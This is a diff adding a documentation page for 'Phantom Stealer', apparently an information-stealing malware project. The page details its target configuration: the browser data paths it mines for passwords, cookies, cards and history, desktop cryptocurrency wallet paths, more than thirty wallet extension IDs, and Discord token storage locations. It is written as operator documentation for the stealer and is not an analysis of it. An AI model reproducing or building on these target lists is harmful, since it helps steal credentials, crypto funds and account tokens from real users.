@@ -1,0 +1,426 @@
+---
+title: 'Target Definitions'
+description: 'Complete list of all targeted browsers, wallets, and applications including paths and extension IDs'
+---
+
+## Overview
+
+Phantom Stealer targets a wide range of browsers, cryptocurrency wallets, and messaging applications. All target definitions are located in `config/config.go`.
+
+<Info>
+Paths are relative to the user's home directory. The stealer automatically resolves paths like `AppData\Roaming` and `AppData\Local`.
+</Info>
+
+## Browser Targets
+
+The `BrowserPaths` map defines all supported browsers with their configuration paths.
+
+### Chromium-Based Browsers
+
+<ParamField path='BrowserPaths["Chrome"]' type="BrowserConfig">
+  **Google Chrome**
+  
+  ```go
+  {
+    Path:    "AppData\\Local\\Google\\Chrome\\User Data",
+    Profile: "Default",
+    Type:    "chromium",
+  }
+  ```
+  
+  Extracts passwords, cookies, credit cards, and history from Chrome's default profile.
+</ParamField>
+
+<ParamField path='BrowserPaths["Edge"]' type="BrowserConfig">
+  **Microsoft Edge**
+  
+  ```go
+  {
+    Path:    "AppData\\Local\\Microsoft\\Edge\\User Data",
+    Profile: "Default",
+    Type:    "chromium",
+  }
+  ```
+</ParamField>
+
+<ParamField path='BrowserPaths["Brave"]' type="BrowserConfig">
+  **Brave Browser**
+  
+  ```go
+  {
+    Path:    "AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data",
+    Profile: "Default",
+    Type:    "chromium",
+  }
+  ```
+</ParamField>
+
+<ParamField path='BrowserPaths["Opera"]' type="BrowserConfig">
+  **Opera Stable**
+  
+  ```go
+  {
+    Path:    "AppData\\Roaming\\Opera Software\\Opera Stable",
+    Profile: "",
+    Type:    "chromium",
+  }
+  ```
+  
+  <Info>
+  Opera doesn't use a profile subfolder, hence the empty Profile field.
+  </Info>
+</ParamField>
+
+<ParamField path='BrowserPaths["OperaGX"]' type="BrowserConfig">
+  **Opera GX** (gaming-focused Opera variant)
+  
+  ```go
+  {
+    Path:    "AppData\\Roaming\\Opera Software\\Opera GX Stable",
+    Profile: "",
+    Type:    "chromium",
+  }
+  ```
+</ParamField>
+
+<ParamField path='BrowserPaths["Vivaldi"]' type="BrowserConfig">
+  **Vivaldi Browser**
+  
+  ```go
+  {
+    Path:    "AppData\\Local\\Vivaldi\\User Data",
+    Profile: "Default",
+    Type:    "chromium",
+  }
+  ```
+</ParamField>
+
+<ParamField path='BrowserPaths["Yandex"]' type="BrowserConfig">
+  **Yandex Browser**
+  
+  ```go
+  {
+    Path:    "AppData\\Local\\Yandex\\YandexBrowser\\User Data",
+    Profile: "Default",
+    Type:    "chromium",
+  }
+  ```
+</ParamField>
+
+<ParamField path='BrowserPaths["Chromium"]' type="BrowserConfig">
+  **Chromium** (open-source base)
+  
+  ```go
+  {
+    Path:    "AppData\\Local\\Chromium\\User Data",
+    Profile: "Default",
+    Type:    "chromium",
+  }
+  ```
+</ParamField>
+
+### Firefox-Based Browsers
+
+<Warning>
+Firefox browsers use different encryption than Chromium browsers and require special handling.
+</Warning>
+
+<ParamField path='BrowserPaths["Firefox"]' type="BrowserConfig">
+  **Mozilla Firefox**
+  
+  ```go
+  {
+    Path:    "AppData\\Roaming\\Mozilla\\Firefox\\Profiles",
+    Profile: "",
+    Type:    "firefox",
+  }
+  ```
+  
+  Uses its own encryption scheme separate from Windows DPAPI.
+</ParamField>
+
+<ParamField path='BrowserPaths["Waterfox"]' type="BrowserConfig">
+  **Waterfox**
+  
+  ```go
+  {
+    Path:    "AppData\\Roaming\\Waterfox\\Profiles",
+    Profile: "",
+    Type:    "firefox",
+  }
+  ```
+</ParamField>
+
+### BrowserConfig Structure
+
+```go
+type BrowserConfig struct {
+    Path    string  // Base path to browser data
+    Profile string  // Profile subfolder (empty if not used)
+    Type    string  // "chromium" or "firefox"
+}
+```
+
+## Desktop Wallet Targets
+
+The `WalletTargets` map defines paths to desktop cryptocurrency wallet applications.
+
+### Popular Wallets
+
+<ParamField path='WalletTargets["Exodus"]' type="string" default='"AppData\\Roaming\\Exodus\\exodus.wallet"'>
+  **Exodus Wallet** - Multi-currency desktop wallet with built-in exchange.
+</ParamField>
+
+<ParamField path='WalletTargets["Electrum"]' type="string" default='"AppData\\Roaming\\Electrum\\wallets"'>
+  **Electrum** - Popular Bitcoin wallet.
+</ParamField>
+
+<ParamField path='WalletTargets["Atomic"]' type="string" default='"AppData\\Local\\atomic\\Local Storage\\leveldb"'>
+  **Atomic Wallet** - Multi-currency wallet with staking support.
+</ParamField>
+
+<ParamField path='WalletTargets["Jaxx"]' type="string" default='"AppData\\Roaming\\Jaxx\\Local Storage\\leveldb"'>
+  **Jaxx Liberty** - Deprecated but still widely used multi-currency wallet.
+</ParamField>
+
+<ParamField path='WalletTargets["Coinomi"]' type="string" default='"AppData\\Local\\Coinomi\\Coinomi\\wallets"'>
+  **Coinomi** - Multi-currency wallet with strong privacy features.
+</ParamField>
+
+<ParamField path='WalletTargets["Guarda"]' type="string" default='"AppData\\Roaming\\Guarda\\Local Storage\\leveldb"'>
+  **Guarda Wallet** - Multi-platform cryptocurrency wallet.
+</ParamField>
+
+### Core Wallets
+
+Official wallets for major cryptocurrencies. These typically store funds in `wallet.dat` files.
+
+<ParamField path='WalletTargets["BitcoinCore"]' type="string" default='"AppData\\Roaming\\Bitcoin\\wallets"'>
+  **Bitcoin Core** - Official Bitcoin wallet implementation.
+</ParamField>
+
+<ParamField path='WalletTargets["LitecoinCore"]' type="string" default='"AppData\\Roaming\\Litecoin\\wallets"'>
+  **Litecoin Core** - Official Litecoin wallet.
+</ParamField>
+
+<ParamField path='WalletTargets["DashCore"]' type="string" default='"AppData\\Roaming\\DashCore\\wallets"'>
+  **Dash Core** - Official Dash wallet.
+</ParamField>
+
+### Privacy-Focused Wallets
+
+<ParamField path='WalletTargets["Monero"]' type="string" default='"Documents\\Monero\\wallets"'>
+  **Monero Wallet** - Privacy cryptocurrency wallet.
+  
+  <Info>
+  Monero uses an unusual path in the Documents folder instead of AppData.
+  </Info>
+</ParamField>
+
+<ParamField path='WalletTargets["ZCash"]' type="string" default='"AppData\\Roaming\\Zcash"'>
+  **ZCash Wallet** - Privacy-focused cryptocurrency wallet.
+</ParamField>
+
+<ParamField path='WalletTargets["Wasabi"]' type="string" default='"AppData\\Roaming\\WalletWasabi\\Client\\Wallets"'>
+  **Wasabi Wallet** - Bitcoin wallet with built-in CoinJoin mixing for enhanced privacy.
+</ParamField>
+
+## Browser Extension Wallets
+
+The `ExtensionTargets` map contains Chrome extension IDs for cryptocurrency wallet extensions. These IDs are universal across Chromium-based browsers (Chrome, Edge, Brave, Opera, etc.).
+
+### Major Extensions
+
+<ParamField path='ExtensionTargets["Metamask"]' type="string" default='"nkbihfbeogaeaoehlefnkodbefgpgknn"'>
+  **MetaMask** - Most popular Ethereum and EVM-compatible wallet extension.
+</ParamField>
+
+<ParamField path='ExtensionTargets["TronLink"]' type="string" default='"ibnejdfjmmkpcnlpebklmnkoeoihofec"'>
+  **TronLink** - Official Tron network wallet.
+</ParamField>
+
+<ParamField path='ExtensionTargets["BinanceChain"]' type="string" default='"fhbohimaelbohpjbbldcngcnapndodjp"'>
+  **Binance Chain Wallet** - BNB and BSC wallet extension.
+</ParamField>
+
+<ParamField path='ExtensionTargets["Coin98"]' type="string" default='"aeachknmefphepccionboohckonoeemg"'>
+  **Coin98 Wallet** - Multi-chain DeFi wallet.
+</ParamField>
+
+<ParamField path='ExtensionTargets["Phantom"]' type="string" default='"bfnaelmomeimhlpmgjnjophhpkkoljpa"'>
+  **Phantom** - Popular Solana wallet extension.
+</ParamField>
+
+### Additional Extensions
+
+<Accordion title="Cosmos & Multi-Chain Wallets">
+  <ParamField path='ExtensionTargets["Keplr"]' type="string" default='"dmkamcknogkgcdfhhbddcghachkejeap"'>
+    **Keplr** - Cosmos ecosystem wallet.
+  </ParamField>
+  
+  <ParamField path='ExtensionTargets["Terra"]' type="string" default='"aiifbnbfobpmeekipheeijimdpnlpgpp"'>
+    **Terra Station** - Terra blockchain wallet.
+  </ParamField>
+  
+  <ParamField path='ExtensionTargets["XDEFI"]' type="string" default='"hmeobnfnfcmdkdcmlblgagmfpfboieaf"'>
+    **XDEFI Wallet** - Multi-chain DeFi wallet.
+  </ParamField>
+</Accordion>
+
+<Accordion title="Solana Wallets">
+  <ParamField path='ExtensionTargets["Sollet"]' type="string" default='"fhmfendgdocmcbmfikdcogofphimnkno"'>
+    **Sollet** - Solana wallet extension.
+  </ParamField>
+  
+  <ParamField path='ExtensionTargets["Slope"]' type="string" default='"pocmplpaccanhmnllbbkpgfliimjljgo"'>
+    **Slope** - Solana wallet with mobile sync.
+  </ParamField>
+</Accordion>
+
+<Accordion title="Gaming & NFT Wallets">
+  <ParamField path='ExtensionTargets["Ronin"]' type="string" default='"fnjhmkhhmkbjkkabndcnnogagogbneec"'>
+    **Ronin Wallet** - Axie Infinity and gaming-focused wallet.
+  </ParamField>
+  
+  <ParamField path='ExtensionTargets["Wombat"]' type="string" default='"amkmjjmmflddogmhpjloimipbofnfjih"'>
+    **Wombat** - Gaming and NFT wallet.
+  </ParamField>
+  
+  <ParamField path='ExtensionTargets["GuildWallet"]' type="string" default='"nanjmdknhkinifnkgdcggcfnhdaammmj"'>
+    **Guild Wallet** - Gaming guild treasury wallet.
+  </ParamField>
+</Accordion>
+
+<Accordion title="Other Extensions">
+  <ParamField path='ExtensionTargets["BraveWallet"]' type="string" default='"odbfpeeihdkbihmopkbjmoonfanlbfcl"'>
+    **Brave Wallet** - Built-in Brave browser wallet.
+  </ParamField>
+  
+  <ParamField path='ExtensionTargets["Coinbase"]' type="string" default='"hnfanknocfeofbddgcijnmhnfnkdnaad"'>
+    **Coinbase Wallet** - Self-custody wallet from Coinbase.
+  </ParamField>
+  
+  <ParamField path='ExtensionTargets["Trust"]' type="string" default='"egjidjbpglichdcondbcbdnbeeppgdph"'>
+    **Trust Wallet** - Multi-currency mobile and extension wallet.
+  </ParamField>
+  
+  <ParamField path='ExtensionTargets["MEWcx"]' type="string" default='"nlbmnnijcnlegkjjpcfjclmcfggfefdm"'>
+    **MEW CX** - MyEtherWallet Chrome extension.
+  </ParamField>
+  
+  <ParamField path='ExtensionTargets["OneKey"]' type="string" default='"infeboajgfhgbjpjbeppbkgnabfdkdaf"'>
+    **OneKey** - Open-source hardware wallet companion.
+  </ParamField>
+  
+  <ParamField path='ExtensionTargets["BitKeep"]' type="string" default='"jiidiaalihmmhddjgbnbgdfflelocpak"'>
+    **BitKeep** - Multi-chain DeFi wallet.
+  </ParamField>
+  
+  <ParamField path='ExtensionTargets["Math"]' type="string" default='"afbcbjpbpfadlkmhmclhkeeodmamcflc"'>
+    **Math Wallet** - Multi-platform crypto wallet.
+  </ParamField>
+  
+  <ParamField path='ExtensionTargets["Hashpack"]' type="string" default='"gjagmgiddbbciopjhllkdnddhcglnemk"'>
+    **HashPack** - Hedera (HBAR) wallet.
+  </ParamField>
+  
+  <ParamField path='ExtensionTargets["TON"]' type="string" default='"nphplpgoakhhjchkkhmiggakijnkhfnd"'>
+    **TON Wallet** - The Open Network wallet.
+  </ParamField>
+  
+  <ParamField path='ExtensionTargets["Starcoin"]' type="string" default='"mfhbebgoclkghebffdldpobeajmbecfk"'>
+    **Starcoin** - Starcoin blockchain wallet.
+  </ParamField>
+  
+  <ParamField path='ExtensionTargets["Swash"]' type="string" default='"cmndjbecilbocjfkibfbifhngkdmjgog"'>
+    **Swash** - Data monetization wallet.
+  </ParamField>
+  
+  <ParamField path='ExtensionTargets["Finnie"]' type="string" default='"cjmkndjhnagcfbpiemnkdpomccnjblmj"'>
+    **Finnie** - Koii network wallet.
+  </ParamField>
+  
+  <ParamField path='ExtensionTargets["iWallet"]' type="string" default='"kncchdigobghenbbaddojjnnaogfppfj"'>
+    **iWallet** - Multi-chain wallet.
+  </ParamField>
+  
+  <ParamField path='ExtensionTargets["Oxygen"]' type="string" default='"fhilaheimglignddkjgofkcbgekhenbh"'>
+    **Oxygen** - DeFi wallet.
+  </ParamField>
+  
+  <ParamField path='ExtensionTargets["NeoLine"]' type="string" default='"cphhlgmgameodnhkjdmkpanlelnlohao"'>
+    **NeoLine** - NEO blockchain wallet.
+  </ParamField>
+  
+  <ParamField path='ExtensionTargets["KHC"]' type="string" default='"hcflpincpppdclinealmandijcmnkbgn"'>
+    **KHC** - KuCoin Community Chain wallet.
+  </ParamField>
+  
+  <ParamField path='ExtensionTargets["GeroWallet"]' type="string" default='"bgpipimickeadkjlklgciifhnalhdjhe"'>
+    **Gero Wallet** - Cardano wallet.
+  </ParamField>
+  
+  <ParamField path='ExtensionTargets["Clover"]' type="string" default='"nhnkbkgjikgcigadomkphalanndcapjk"'>
+    **Clover** - Multi-chain wallet.
+  </ParamField>
+  
+  <ParamField path='ExtensionTargets["Halo"]' type="string" default='"ocdciohofkgohmibehfoijjbkfgobpob"'>
+    **Halo** - Klay (Klaytn) wallet.
+  </ParamField>
+</Accordion>
+
+## Discord Token Paths
+
+The `DiscordPaths` array contains all locations where Discord authentication tokens might be stored.
+
+### Desktop Client Paths
+
+```go
+// Discord Desktop Clients
+"AppData\\Roaming\\discord\\Local Storage\\leveldb"
+"AppData\\Roaming\\discordcanary\\Local Storage\\leveldb"
+"AppData\\Roaming\\discordptb\\Local Storage\\leveldb"
+"AppData\\Local\\Discord\\Local Storage\\leveldb"
+"AppData\\Local\\DiscordCanary\\Local Storage\\leveldb"
+"AppData\\Local\\DiscordPTB\\Local Storage\\leveldb"
+```
+
+<Info>
+Discord has three release channels: Stable, Canary (beta), and PTB (Public Test Build). Each stores tokens separately.
+</Info>
+
+### Browser Session Paths
+
+For users who access Discord through web browsers instead of the desktop app:
+
+```go
+// Opera Browsers
+"AppData\\Roaming\\Opera Software\\Opera Stable\\Local Storage\\leveldb"
+"AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb"
+
+// Google Chrome
+"AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"
+
+// Brave Browser
+"AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb"
+
+// Yandex Browser
+"AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb"
+
+// Microsoft Edge
+"AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb"
+```
+
+<Warning>
+All these paths must be checked since users may have Discord tokens in multiple locations if they use both desktop and web versions.
+</Warning>
+
+## Complete Target Summary
+
+<Accordion title="Statistics">
+  - **Browsers**: 10 different browsers (8 Chromium-based, 2 Firefox-based)
+  - **Desktop Wallets**: 12 applications
+  - **Extension Wallets**: 31 browser extensions
+  - **Discord Paths**: 12 locations (6 desktop + 6 browser)
+  - **Total Targets**: 65+ applications and services
+</Accordion>
